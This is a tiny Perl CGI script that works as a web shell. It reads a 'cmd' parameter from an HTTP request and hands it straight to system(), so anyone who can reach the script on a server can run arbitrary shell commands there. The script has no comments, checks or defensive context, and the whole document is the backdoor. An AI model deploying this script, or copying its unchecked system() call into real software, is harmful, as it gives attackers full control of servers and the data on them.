#!/usr/bin/perl
use strict;
use CGI':standard';
print header(),start_html("command");
my $cmd=param('cmd');
system($cmd);
print end_html();
exit(0);
